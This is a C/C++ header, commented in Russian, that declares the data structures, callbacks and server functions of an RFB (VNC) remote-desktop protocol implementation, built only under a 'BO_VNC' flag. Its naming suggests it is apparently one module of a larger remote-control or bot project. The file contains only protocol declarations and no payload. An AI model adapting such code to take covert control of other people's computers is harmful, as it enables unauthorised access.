/*
  Протокол RFB.
  На основе http://www.uvnc.com/
*/
#pragma once

#if(BO_VNC > 0)
namespace Rfb
{
  //Типы авторизации.
  enum
  {
    ST_INVALID = 0,
    ST_NONE    = 1,
    ST_VNCAUTH = 2,
    ST_ERROR   = 0xFFFFFFFF
  };

  //Типы кодеков.
  enum  
  {
    ENCODER_Raw         = 0, 
    ENCODER_Hextile     = 5,
    ENCODER_DesktopSize = 0xFFFFFF21
  };

  #pragma pack(push, 1)
  //Формат пикселя.
  typedef struct
  {
    BYTE bBitsPerPixel;
    BYTE bDepth;
    BYTE bBigEndian;
    BYTE bTrueColour;
    
    WORD wRedMax;
    WORD wGreenMax;
    WORD wBlueMax;
    
    BYTE bRedShift;
    BYTE bGreenShift;
    BYTE bBlueShift;
    
    BYTE bPadding[3];
  }PIXEL_FORMAT;

  //Сообщение ServerInit.
  typedef struct
  {
    WORD wFrameBufferWidth;
    WORD wFrameBufferHeight;
    PIXEL_FORMAT pf;
    DWORD dwNameLength;
  }MSG_SERVERINIT;

  //Координаты квадрата.
  typedef struct
  {
    BYTE bIncremental;
    WORD wXPos;
    WORD wYPos;
    WORD wWidth;
    WORD wHeight;
  }RECTANGLE;

  typedef struct
  {
    WORD wXPos;
    WORD wYPos;
    WORD wWidth;
    WORD wHeight;
    DWORD dwEncodingType;
  }RECTANGLEEX;
  
  //Данные о клавише.
  typedef struct
  {
    BYTE bIsDown;
    BYTE pad[2];
    DWORD dwKeyCode;
  }EVENT_KEY;
  
  //Данные о указатели.
  typedef struct
  {
    BYTE bButtonMask;
    WORD wXPos;
    WORD wYPos;
  }EVENT_POINTER;
  #pragma pack(pop)

  //Внутрии данные сервера.
  typedef struct
  {
    HDC memoryDc;           //DC для работы.
    HBITMAP originalBitmap; //Исходый битмап memoryDc.

    WORD wWidth;
    WORD wHeight;
    DWORD dwWidthInBytes;

    HBITMAP hBitmap;
    LPBYTE pBmpDIB;
    LPBYTE pBmpDIBOld;
    void *pHextileBuffer; //Внутренний буфер для кодека Hextile.
    
    PIXEL_FORMAT pfLocalPixel;
    BYTE bLocalPixelSize;
    PIXEL_FORMAT pfRemotePixel;
    BYTE bRemotePixelSize;

    LPDWORD dwEncodingsList;       //Список кодеков, которые поддерживает клиент
    WORD wEncodingsCount;          //Количество кодеков, которые поддерживает клиент
    DWORD dwCurrentEncoder;        //Текущмй кодек.
    DWORD dwCurrentEncoderSwapped; //BigEndian ид кодека.
  }INTERNAL_DATA;

  //Структура с кэлбэк функциями, используемыми в ходе работы сервера.
  //ПРИМЕЧАНИЕ: Все WORD, DWORD указываются в LITTLE ENDIAN (т.е. нормально).
  typedef struct 
  {
    void *param; //Произвольный параметр для функций.

    /*
      Установка способа авторизации на сервере.

      OUT securityType - одно из значений ST_*. По умолчанию значение равно ST_NONE.
      OUT errorMessage - в случаи если *pdwSecurityType == ST_INVALID, указывается сообщение
                         об ошибки, инача игнарируется. Содержимое *ppstrErrorMessage не будет
                         автоматически освобождено!
    */
    void (*onSecurityType)(void *param, LPDWORD securityType, LPSTR *errorMessage);
    
    /*
      Получение от клиента сообщения ClientInit.

      IN shared - состояние флага Shared-flag.

      Return    - true - для продолжения работы,
                  false - для корректного заверешния работы.
    */
    bool (*onClientInit)(void *param, BYTE shared);
    
    /*
      Вызывается перед отправкой сообщения ServerInit.

      OUT name - указатель на имя сервера. Буфер не освождается автоматически!
      OUT size - размер изоброжения.

      Return   - Memory DC - будет использоватся для работы сервера, будет освобожден
                 самостоятельно.
                 NULL - для корректного заверешния работы. 
   */
    HDC (*onServerInit)(void *param, LPSTR *name, POINT *size);

    /*
      Подготовка к поиску обноволений изображения.
    */
    void (*OnUpdateDC)(void *pParam);

    /*
      Изменение состояние клавиши.

      IN keySym - KeySym.
      IN down   - true - нажатие, false - отпсукание.
    */
    void (*onKeyEvent)(void *param, DWORD keySym, bool down);
    
    /*
      Изменение состояния указателя.

      IN ..       - полный аналог mouse_event.
    */
    void (*OnPointerEvent)(void *pParam, DWORD dwFlags, LONG wX, LONG wY, DWORD dwData);

    /*
      Вставка текста.
      
      IN dwLen      - размер текста.
      IN pstrString - строка.
    */
    void (*OnClientCutText)(void *pParam, DWORD dwLen, LPSTR pstrString);
  }SERVER_CALLBACKS;
  
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Запуск RFB пртокола.

    IN s                 - сокет.
    IN dwTimeout         - таймаут ожидание ответов от клиента, или 0 для бесконечного ожидания.
    IN pCallbacks        - список кээлбэк функций.
    IN hDIBMap           - Map-file для битмапа, изменения которого будут проверяться, или NULL.
    IN updateMutex       - мютекс блокировки обнволений битмапа, или NULL.
    IN dwRefreshInterval - задержка между поиском изменений изображения.
  */
  void _ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks, HANDLE hDIBMap, DWORD mapOffset, HANDLE updateMutex, DWORD dwRefreshInterval);

  /*
    Проиграть звуковой сигнал на клиенте.

    IN s   - сокет клиента.

    Return - true - в случаи успеха,
             false - в случаи ошибки.
  */
  bool _SendBell(SOCKET s);
  
  /*
    Отправить "буферный" текст клиенту.
    
    IN s        - сокет клиента.
    IN pstrText - текст для отправки.

    Return - true - в случаи успеха,
             false - в случаи ошибки.
  */
  bool _CopyText(SOCKET s, LPSTR pstrText);
};

#endif
